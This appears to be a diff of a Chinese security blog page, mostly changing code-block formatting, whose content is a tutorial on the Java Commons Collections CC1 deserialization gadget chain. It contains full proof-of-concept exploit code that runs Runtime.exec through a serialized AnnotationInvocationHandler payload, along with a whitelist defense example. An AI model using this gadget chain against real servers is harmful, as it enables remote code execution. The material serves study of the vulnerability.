+<pre class="line-numbers language-none"><code class="language-none">readObject() → 调用A类方法 → 调用B类方法 →...→ 执行Runtime.exec()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">
+
+readObject-&gt;&gt;TransformedMap: 遍历Map触发setValue()
+TransformedMap-&gt;&gt;ChainedTransformer: 调用transform()
+ChainedTransformer-&gt;&gt;InvokerTransformer1: 执行ConstantTransformer
+InvokerTransformer1-&gt;&gt;InvokerTransformer2: 反射getMethod()
+InvokerTransformer2-&gt;&gt;InvokerTransformer3: 反射invoke()
+InvokerTransformer3-&gt;&gt;Runtime.exec(): 弹计算器！<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong>解题方法</strong>：</p>
 <ol>
 <li><strong>起点</strong>：找到一个可触发反序列化的入口（如网络接口接收数据流）</li>
@@ -726,7 +844,16 @@
 <li><strong>白名单控制</strong>：限制可反序列化的类（如 <code>ObjectInputStream</code> 的 <code>accept</code> 列表）</li>
 <li><strong>加固关键类</strong>：对敏感类（如 <code>ObjectInputStream</code>）重写 <code>resolveClass()</code> 做校验</li>
 </ol>
-<figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs scala"><span class="hljs-comment">// 防御示例：自定义ObjectInputStream添加白名单</span><br>public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SafeObjectInputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ObjectInputStream</span> </span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-type">Class</span>&lt;?&gt; resolveClass(<span class="hljs-type">ObjectStreamClass</span> desc) <span class="hljs-keyword">throws</span> <span class="hljs-type">IOException</span>, <span class="hljs-type">ClassNotFoundException</span> &#123;<br>        <span class="hljs-keyword">if</span> (!desc.getName().equals(<span class="hljs-string">&quot;com.safe.MyClass&quot;</span>)) &#123; <span class="hljs-comment">// 只允许反序列化指定类</span><br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-type">InvalidClassException</span>(<span class="hljs-string">&quot;Unauthorized class: &quot;</span>, desc.getName());<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">super</span>.resolveClass(desc);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 防御示例：自定义ObjectInputStream添加白名单
+public class SafeObjectInputStream extends ObjectInputStream &#123;
+    @Override
+    protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException &#123;
+        if (!desc.getName().equals(&quot;com.safe.MyClass&quot;)) &#123; &#x2F;&#x2F; 只允许反序列化指定类
+            throw new InvalidClassException(&quot;Unauthorized class: &quot;, desc.getName());
+        &#125;
+        return super.resolveClass(desc);
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <hr>
 <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><p>Java反序列化漏洞的本质是：<br><strong>控制输入流 → 触发危险 <code>readObject()</code> → 串联调用链（Gadget）→ 达到攻击效果</strong>  </p>
@@ -734,7 +861,11 @@
 <li><p><strong>JDK版本</strong>：≤8u65（高版本修复<code>AnnotationInvocationHandler</code>的反序列化逻辑）<br>下载：<a target="_blank" rel="noopener" href="https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html</a> ；<br>（友情提示：如果下载出来是jdk8u111，把&#x2F;cn删去）</p>
 </li>
 <li><p><strong>依赖库</strong>：Commons Collections 3.2.1</p>
-  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure></li>
+  <pre class="line-numbers language-none"><code class="language-none">&lt;dependency&gt;
+    &lt;groupId&gt;commons-collections&lt;&#x2F;groupId&gt;
+    &lt;artifactId&gt;commons-collections&lt;&#x2F;artifactId&gt;
+    &lt;version&gt;3.2.1&lt;&#x2F;version&gt;
+&lt;&#x2F;dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
 </ul>
 <h4 id="2-漏洞核心逻辑"><a href="#2-漏洞核心逻辑" class="headerlink" title="2. 漏洞核心逻辑"></a>2. <strong>漏洞核心逻辑</strong></h4><ul>
 <li><strong>先找到起点</strong>：反序列化入口<code>AnnotationInvocationHandler.readObject()</code></li>
@@ -743,10 +874,14 @@
 </ul>
 <hr>
 <h3 id="二、分步拆解：CC1链的构造"><a href="#二、分步拆解：CC1链的构造" class="headerlink" title="二、分步拆解：CC1链的构造"></a><strong>二、分步拆解：CC1链的构造</strong></h3><h4 id="步骤1：终点-InvokerTransformer"><a href="#步骤1：终点-InvokerTransformer" class="headerlink" title="步骤1：终点 - InvokerTransformer"></a><strong>步骤1：终点 - <code>InvokerTransformer</code></strong></h4><p><strong>作用</strong>：通过反射动态调用任意方法，是命令执行的最终触发点。<br><strong>关键代码</strong>：</p>
-<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-built_in">public</span> <span class="hljs-keyword">Object</span> <span class="hljs-keyword">transform</span>(<span class="hljs-keyword">Object</span> <span class="hljs-keyword">input</span>) &#123;<br>    <span class="hljs-keyword">Method</span> <span class="hljs-keyword">method</span> = <span class="hljs-keyword">input</span>.getClass().getMethod(iMethodName, iParamTypes);<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">method</span>.invoke(<span class="hljs-keyword">input</span>, iArgs); // 反射调用任意方法<br>&#125;<br></code></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">public Object transform(Object input) &#123;
+    Method method &#x3D; input.getClass().getMethod(iMethodName, iParamTypes);
+    return method.invoke(input, iArgs); &#x2F;&#x2F; 反射调用任意方法
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><strong>测试验证</strong>：</p>
-<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livescript">InvokerTransformer <span class="hljs-literal">it</span> = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;<span class="hljs-built_in">String</span>.<span class="hljs-keyword">class</span>&#125;, <span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br><span class="hljs-literal">it</span>.transform(Runtime.getRuntime()); <span class="hljs-regexp">// 弹出计算器</span><br></code></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">InvokerTransformer it &#x3D; new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);
+it.transform(Runtime.getRuntime()); &#x2F;&#x2F; 弹出计算器<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p><strong>为什么是它？</strong></p>
 <ul>
@@ -760,10 +895,22 @@
 <li>**<code>ChainedTransformer</code>**：串联多个<code>Transformer</code>，前者的输出作为后者的输入。</li>
 </ul>
 <p><strong>构造反射链</strong>：</p>
-<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dart">Transformer[] chain = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>    <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.<span class="hljs-keyword">class</span>), <span class="hljs-comment">// 返回Runtime.class对象</span><br>    <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,     <span class="hljs-comment">// 反射调用getMethod(&quot;getRuntime&quot;)</span><br>        <span class="hljs-keyword">new</span> Class[]&#123;<span class="hljs-built_in">String</span>.<span class="hljs-keyword">class</span>, Class[].<span class="hljs-keyword">class</span>&#125;, <br>        <span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,         <span class="hljs-comment">// 调用getRuntime()获取实例</span><br>        <span class="hljs-keyword">new</span> Class[]&#123;<span class="hljs-built_in">Object</span>.<span class="hljs-keyword">class</span>, <span class="hljs-built_in">Object</span>[].<span class="hljs-keyword">class</span>&#125;, <br>        <span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,          <span class="hljs-comment">// 执行命令</span><br>        <span class="hljs-keyword">new</span> Class[]&#123;<span class="hljs-built_in">String</span>.<span class="hljs-keyword">class</span>&#125;, <br>        <span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>&#125;;<br>Transformer chain = <span class="hljs-keyword">new</span> ChainedTransformer(chain);<br></code></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">Transformer[] chain &#x3D; new Transformer[]&#123;
+    new ConstantTransformer(Runtime.class), &#x2F;&#x2F; 返回Runtime.class对象
+    new InvokerTransformer(&quot;getMethod&quot;,     &#x2F;&#x2F; 反射调用getMethod(&quot;getRuntime&quot;)
+        new Class[]&#123;String.class, Class[].class&#125;, 
+        new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
+    new InvokerTransformer(&quot;invoke&quot;,         &#x2F;&#x2F; 调用getRuntime()获取实例
+        new Class[]&#123;Object.class, Object[].class&#125;, 
+        new Object[]&#123;null, null&#125;),
+    new InvokerTransformer(&quot;exec&quot;,          &#x2F;&#x2F; 执行命令
+        new Class[]&#123;String.class&#125;, 
+        new Object[]&#123;&quot;calc.exe&quot;&#125;)
+&#125;;
+Transformer chain &#x3D; new ChainedTransformer(chain);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><strong>逻辑等价</strong>：</p>
-<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">Runtime.getRuntime().exec(&quot;calc.exe&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><strong>为什么用链？</strong></p>
 <ul>
@@ -777,7 +924,9 @@
 <li><code>checkSetValue()</code>：在<code>MapEntry.setValue()</code>时触发<code>valueTransformer.transform()</code>。</li>
 </ul>
 <p><strong>构造触发点</strong>：</p>
-<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">String</span>&gt; rawMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>rawMap.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>); <span class="hljs-comment">// 需注意：key必须为&quot;value&quot;（见步骤4）</span><br><span class="hljs-built_in">Map</span> transformedMap = TransformedMap.decorate(rawMap, <span class="hljs-keyword">null</span>, chain); <span class="hljs-comment">// 绑定Transformer链</span><br></code></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">Map&lt;String, String&gt; rawMap &#x3D; new HashMap&lt;&gt;();
+rawMap.put(&quot;key&quot;, &quot;value&quot;); &#x2F;&#x2F; 需注意：key必须为&quot;value&quot;（见步骤4）
+Map transformedMap &#x3D; TransformedMap.decorate(rawMap, null, chain); &#x2F;&#x2F; 绑定Transformer链<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p><strong>为什么是它？</strong></p>
 <ul>
@@ -795,7 +944,10 @@
 </li>
 </ul>
 <p><strong>反射构造实例</strong>：</p>
-<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Class</span>&lt;?&gt; clazz = <span class="hljs-keyword">Class</span>.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);<br>Constructor&lt;?&gt; ctor = clazz.getDeclaredConstructor(<span class="hljs-keyword">Class</span>.<span class="hljs-keyword">class</span>, Map.<span class="hljs-keyword">class</span>);<br>ctor.setAccessible(<span class="hljs-keyword">true</span>);<br><span class="hljs-keyword">Object</span> <span class="hljs-keyword">handler</span> = ctor.newInstance(Target.<span class="hljs-keyword">class</span>, transformedMap); // 使用Target注解类<br></code></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">Class&lt;?&gt; clazz &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+Constructor&lt;?&gt; ctor &#x3D; clazz.getDeclaredConstructor(Class.class, Map.class);
+ctor.setAccessible(true);
+Object handler &#x3D; ctor.newInstance(Target.class, transformedMap); &#x2F;&#x2F; 使用Target注解类<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><strong>为什么是Target.class？</strong></p>
 <ul>
@@ -803,10 +955,72 @@
 </ul>
 <hr>
 <h4 id="步骤5：组装Payload并触发漏洞"><a href="#步骤5：组装Payload并触发漏洞" class="headerlink" title="步骤5：组装Payload并触发漏洞"></a><strong>步骤5：组装Payload并触发漏洞</strong></h4><p><strong>完整POC代码</strong>：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1Exploit</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 1. 构造Transformer链</span><br>        Transformer[] chain = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(chain);<br><br>        <span class="hljs-comment">// 2. 创建TransformedMap</span><br>        Map&lt;String, String&gt; rawMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        rawMap.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;dummy&quot;</span>); <span class="hljs-comment">// Key必须为&quot;value&quot;！</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">transformedMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(rawMap, <span class="hljs-literal">null</span>, chain);<br><br>        <span class="hljs-comment">// 3. 反射构造AnnotationInvocationHandler</span><br>        Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; ctor = clazz.getDeclaredConstructor(Class.class, Map.class);<br>        ctor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> ctor.newInstance(Target.class, transformedMap);<br><br>        <span class="hljs-comment">// 4. 序列化Payload</span><br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;payload.bin&quot;</span>))) &#123;<br>            oos.writeObject(handler);<br>        &#125;<br><br>        <span class="hljs-comment">// 5. 反序列化触发漏洞（模拟目标环境）</span><br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;payload.bin&quot;</span>))) &#123;<br>            ois.readObject(); <span class="hljs-comment">// 此处弹出计算器！</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.*;
+import org.apache.commons.collections.map.TransformedMap;
+import java.io.*;
+import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CC1Exploit &#123;
+    public static void main(String[] args) throws Exception &#123;
+        &#x2F;&#x2F; 1. 构造Transformer链
+        Transformer[] chain &#x3D; new Transformer[]&#123;
+            new ConstantTransformer(Runtime.class),
+            new InvokerTransformer(&quot;getMethod&quot;, 
+                new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
+            new InvokerTransformer(&quot;invoke&quot;, 
+                new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),
+            new InvokerTransformer(&quot;exec&quot;, 
+                new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc.exe&quot;&#125;)
+        &#125;;
+        ChainedTransformer chain &#x3D; new ChainedTransformer(chain);
+
+        &#x2F;&#x2F; 2. 创建TransformedMap
+        Map&lt;String, String&gt; rawMap &#x3D; new HashMap&lt;&gt;();
+        rawMap.put(&quot;value&quot;, &quot;dummy&quot;); &#x2F;&#x2F; Key必须为&quot;value&quot;！
+        Map transformedMap &#x3D; TransformedMap.decorate(rawMap, null, chain);
+
+        &#x2F;&#x2F; 3. 反射构造AnnotationInvocationHandler
+        Class&lt;?&gt; clazz &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        Constructor&lt;?&gt; ctor &#x3D; clazz.getDeclaredConstructor(Class.class, Map.class);
+        ctor.setAccessible(true);
+        Object handler &#x3D; ctor.newInstance(Target.class, transformedMap);
+
+        &#x2F;&#x2F; 4. 序列化Payload
+        try (ObjectOutputStream oos &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;payload.bin&quot;))) &#123;
+            oos.writeObject(handler);
+        &#125;
+
+        &#x2F;&#x2F; 5. 反序列化触发漏洞（模拟目标环境）
+        try (ObjectInputStream ois &#x3D; new ObjectInputStream(new FileInputStream(&quot;payload.bin&quot;))) &#123;
+            ois.readObject(); &#x2F;&#x2F; 此处弹出计算器！
+        &#125;
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>或者：</p>
-<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs livescript"> <span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.<span class="hljs-keyword">map</span>.TransformedMap;  <br>  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br><span class="hljs-keyword">import</span> java.util.<span class="hljs-built_in">Map</span>;  <br>  <br>public <span class="hljs-keyword">class</span> <span class="hljs-title class_">SetValueTest01</span> &#123;  <br>    public <span class="hljs-keyword">static</span> <span class="hljs-literal">void</span> main(<span class="hljs-built_in">String</span>[] args) &#123;  <br>        Runtime runtime = Runtime.getRuntime();  <br> InvokerTransformer invokerTransformer = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>  <br> , <span class="hljs-keyword">new</span> Class[]&#123;<span class="hljs-built_in">String</span>.<span class="hljs-keyword">class</span>&#125;, <span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);  <br> HashMap&lt;<span class="hljs-built_in">Object</span>, <span class="hljs-built_in">Object</span>&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();  <br> hashMap.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);  <br> <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">Object</span>, <span class="hljs-built_in">Object</span>&gt; decorateMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, invokerTransformer);  <br> <span class="hljs-keyword">for</span> (<span class="hljs-built_in">Map</span>.Entry entry:decorateMap.entrySet())&#123;  <br>            entry.setValue(runtime);  <br> &#125;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none"> import org.apache.commons.collections.functors.InvokerTransformer;  
+import org.apache.commons.collections.map.TransformedMap;  
+  
+import java.util.HashMap;  
+import java.util.Map;  
+  
+public class SetValueTest01 &#123;  
+    public static void main(String[] args) &#123;  
+        Runtime runtime &#x3D; Runtime.getRuntime();  
+ InvokerTransformer invokerTransformer &#x3D; new InvokerTransformer(&quot;exec&quot;  
+ , new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);  
+ HashMap&lt;Object, Object&gt; hashMap &#x3D; new HashMap&lt;&gt;();  
+ hashMap.put(&quot;key&quot;, &quot;value&quot;);  
+ Map&lt;Object, Object&gt; decorateMap &#x3D; TransformedMap.decorate(hashMap, null, invokerTransformer);  
+ for (Map.Entry entry:decorateMap.entrySet())&#123;  
+            entry.setValue(runtime);  
+ &#125;  
+    &#125;  
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <hr>
 <h3 id="三、调试与遇到的问题"><a href="#三、调试与遇到的问题" class="headerlink" title="三、调试与遇到的问题"></a><strong>三、调试与遇到的问题</strong></h3><h4 id="1-断点位置"><a href="#1-断点位置" class="headerlink" title="1. 断点位置"></a>1. <strong>断点位置</strong></h4><ul>
@@ -1342,7 +1556,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">48k</span>&nbsp;字
+                class="white-color">46.6k</span>&nbsp;字
             
             
             
